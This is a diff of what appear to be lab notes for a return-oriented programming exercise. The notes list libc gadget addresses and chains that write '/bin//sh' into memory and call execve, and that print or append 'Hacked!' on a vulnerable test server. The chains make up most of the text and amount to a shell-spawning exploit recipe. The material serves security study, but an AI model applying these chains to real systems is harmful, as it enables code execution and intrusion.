@@ -18,15 +18,15 @@ https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options
 
     --> From the ROP tutorial PDF:
 
-    Data segment: 0x0804a020 - 0x0804a028 is .data
+    Data segment: 0x0804a024 - 0x0804a02c is .data
     Linked library segment: b7e18000-b7fc5000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.17.so
 
     ROP command: 0xf5160L: pop ecx ; pop eax ;;
-    Data       :"/bin" = 0x2f62696e
+    Data       : 0x2f62696e: /bin
     Address    : 0x4: Offset for /bin (.data base)
     ROP command: 0x2e09fL: mov [eax] ecx ;;
     ROP command: 0xf5160L: pop ecx ; pop eax ;;
-    Data       :"//sh" = 0x2f2f7368
+    Data       : 0x2f2f7368: //sh
     Address    : 0x8: Offset for //sh (.data base)
     ROP command: 0x2e09fL: mov [eax] ecx ;;
     ROP command: 0x34964L: xor eax eax ;;
@@ -46,11 +46,11 @@ https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options
     return address: 0xbfffed5c
 
     ROP command: 0xf5160L: pop ecx ; pop eax ;;
-    Data       :"/bin" = 0x2f62696e
+    Data       : 0x2f62696e: /bin
     Address    : End of stack
     ROP command: 0x2e09fL: mov [eax] ecx ;;
     ROP command: 0xf5160L: pop ecx ; pop eax ;;
-    Data       :"//sh" = 0x2f2f7368
+    Data       : 0x2f2f7368: //sh
     Address    : End of stack (Return address + size of stack *4 ) + 4
     ROP command: 0x2e09fL: mov [eax] ecx ;;
     ROP command: 0x34964L: xor eax eax ;;
@@ -70,11 +70,11 @@ https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options
     Linked library segment: b7e20000-b7fc3000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.15.so
 
     ROP command: 0xf2d21L: pop ecx ; pop eax ;;
-    Data       :"/bin" = 0x2f62696e
+    Data       : 0x2f62696e: /bin
     Address    : 0x4: Offset for /bin (.data base)
     ROP command: 0x2d71fL: mov [eax] ecx ;;
     ROP command: 0xf2d21L: pop ecx ; pop eax ;;
-    Data       :"//sh" = 0x2f2f7368
+    Data       : 0x2f2f7368: //sh
     Address    : 0x8: Offset for //sh (.data base)
     ROP command: 0x2d71fL: mov [eax] ecx ;;
     ROP command: 0x341a5L: xor eax eax ;;
@@ -89,8 +89,39 @@ https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options
     ROP command: 0x148428L: add eax 0xb ;;
     ROP command: 0xb8dc5L: call dword [gs:0x10] ;;
 
+3. Commands needed to print "Hacked!" in the terminal console of the vulnerable server
+    
+    Library version - libc-2.17
 
-3. Commands needed to append "Hacked!" to "index.html" of the vulnerable server
+    Data segment of simple_server: 0x0804b088 - 0x0804b090 is .data
+
+    ROP command: 0xf5160L: pop ecx ; pop eax ;;
+    Data       : 0x6b636148: Hack
+    Address    : 0x4: Offset for Hack (.data base)
+    ROP command: 0x2e09fL: mov [eax] ecx ;;
+    ROP command: 0xf5160L: pop ecx ; pop eax ;;
+    Data       : 0x21216465: ed!!
+    Address    : 0x8: Offset for ed!! (.data base)
+    ROP command: 0x2e09fL: mov [eax] ecx ;;
+    ROP command: 0x34964L: xor eax eax ;;
+    ROP command: 0x7d9f8L: mov eax 0x1 ;;
+    ROP command: 0x122339L: mov edx eax ; mov eax edx ;;
+    ROP command: 0xdf572L: mov ebx edx ;;
+    ROP command: 0x34964L: xor eax eax ;;
+    ROP command: 0x2e8bbL: pop ecx ; pop edx ;;
+    Address    : 0x4: Offset for Hack (.data base)
+    Address    : 0xc: Offset for NULL (.data base)
+    ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;
+    ROP command: 0x34964L: xor eax eax ;;
+    ROP command: 0xa9a40L: mov eax 0x7 ;;
+    ROP command: 0x122339L: mov edx eax ; mov eax edx ;;
+    ROP command: 0x1369e7L: inc edx ;;
+    ROP command: 0x34964L: xor eax eax ;;
+    ROP command: 0xa9a10L: mov eax 0x4 ;;
+    ROP command: 0xbaa75L: call dword [gs:0x10] ;;
+
+
+4. Commands needed to append "Hacked!" to "index.html" of the vulnerable server
 
     Data segment of simple_server: 0x0804b088 - 0x0804b090 is .data
 
@@ -115,8 +146,3 @@ https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options
     ROP command: 0x17b6d7L: inc ecx ;;
     ROP command: 0x17b6d7L: inc ecx ;; Store 0x2 in ecx
     ROP command: EDX needs to contain 0644 or 0x1a4, find a way to do this.
-
-
-
-
-
